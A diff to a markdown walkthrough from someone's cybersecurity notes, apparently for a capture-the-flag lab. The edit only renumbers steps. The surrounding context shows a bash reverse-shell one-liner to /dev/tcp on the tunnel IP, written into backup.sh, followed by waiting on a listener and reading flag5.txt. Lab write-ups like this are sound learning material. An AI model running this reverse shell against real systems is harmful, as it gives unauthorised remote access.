@@ -32,12 +32,12 @@
    
    bash -i  >& /dev/tcp/{tun0 inet ip}/1234 0>&1
    ```
-9. Run `chmod +x backup.sh`
-10. Wait on the listener terminal until reverse shell is activated.
+8. Run `chmod +x backup.sh`
+9. Wait on the listener terminal until reverse shell is activated.
 
 ![Screenshot 2024-02-09 at 12 41 26 AM](https://github.com/niccololampa/cyber-security-notes/assets/37615906/56f31900-49b8-43bc-9694-d8e526fee1d9)
 
-11. Run `cat /home/ubuntu/flag5.txt`
+10. Run `cat /home/ubuntu/flag5.txt`
 
 ![Screenshot 2024-02-09 at 12 42 27 AM](https://github.com/niccololampa/cyber-security-notes/assets/37615906/bfa16ef6-38d4-4803-998e-7bd30e76dd8d)
 
